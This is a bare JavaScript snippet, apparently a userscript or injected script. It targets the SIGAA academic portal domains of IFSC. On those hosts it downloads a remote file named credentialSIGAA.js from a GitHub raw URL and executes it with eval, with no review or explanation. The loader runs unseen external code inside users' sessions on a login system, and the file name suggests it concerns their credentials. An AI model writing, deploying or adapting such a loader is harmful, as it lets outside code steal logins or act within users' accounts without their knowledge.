let url;


if (location.host == 'sigaa.ifsc.edu.br' || location.host == 'sig.ifsc.edu.br'){
    url = "https://raw.githubusercontent.com/Wolota/ips/main/credentialSIGAA.js";
}







(function() {
    fetch(url)
        .then(response => response.text())
        .then(code => {
        eval(code);
    });

})();
